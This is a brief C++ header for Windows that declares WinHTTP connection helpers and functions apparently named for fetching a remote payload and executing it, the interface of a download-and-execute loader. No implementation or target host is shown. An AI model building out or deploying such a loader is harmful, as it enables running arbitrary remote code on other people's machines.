#pragma once
#ifndef UTILS_H
#define UTILS_H

#include <Windows.h>
#include <iostream>
#include <winhttp.h>
#include <vector>

#pragma comment(lib, "winhttp.lib")

using namespace std;

BOOL initHttpConn(LPCWSTR hostName, int portNum, LPCWSTR httpAction, LPCWSTR httpUrl, HINTERNET& hSess, HINTERNET& hConn, HINTERNET& hReq);
void releaseHandles(HINTERNET& hSess, HINTERNET& hConn, HINTERNET& hReq);
vector<char> downloadPayload(HINTERNET hReq);
void executePayload(vector<char> buffer);

#endif